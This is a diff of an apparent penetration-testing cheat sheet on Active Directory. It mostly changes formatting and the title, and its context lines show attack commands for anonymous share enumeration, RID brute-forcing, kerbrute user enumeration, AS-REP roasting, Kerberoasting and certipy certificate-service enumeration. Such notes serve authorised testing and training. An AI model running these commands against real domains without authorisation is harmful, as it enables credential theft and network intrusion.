@@ -1,8 +1,22 @@
 ---
 icon: windows
+layout:
+  width: default
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: false
+  pagination:
+    visible: false
+  metadata:
+    visible: false
 ---
 
-# Active Directory
+# Active Directory Methodology
 
 ## No credentials
 
@@ -25,7 +39,7 @@ dig axfr <domain> @<dc_ip>
 
 ### Shares
 
-```bash
+```sh
 nxc smb <IP> -u '' -p '' --shares
 nxc smb <IP> -u 'guest' -p '' --shares
 ```
@@ -39,7 +53,7 @@ nxc smb <dc_ip> --rid-brute 10000
 ```
 {% endcode %}
 
-```bash
+```sh
 kerbrute userenum -d <domain> <users.txt>
 ```
 
@@ -70,7 +84,7 @@ nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>
 {% endcode %}
 
 {% code overflow="wrap" %}
-```bash
+```sh
 GetNPUsers.py <domain>/ -usersfile <users.txt>
 ```
 {% endcode %}
@@ -134,7 +148,7 @@ certipy find -u '<user>@<domain>' -p '<password>' -dc-ip '<dc_ip>' -stdout
 ### Kerberoast
 
 {% code overflow="wrap" %}
-```bash
+```sh
 nxc ldap <dc_ip> -u '<user>' -p '<password>' --kerberoasting <output.txt>
 ```
 {% endcode %}
@@ -149,7 +163,7 @@ GetUserSPNs.py -request -dc-ip <dc_ip> '<domain>/<user>:<password>'
 If you find this error from Linux: `KRB_AP_ERR_SKEW(Clock skew too great)` it's because of your local time, you need to synchronise the host with the DC.
 
 {% code overflow="wrap" fullWidth="false" %}
-```bash
+```sh
 sudo ntpdate <dc_ip>
 ```
 {% endcode %}
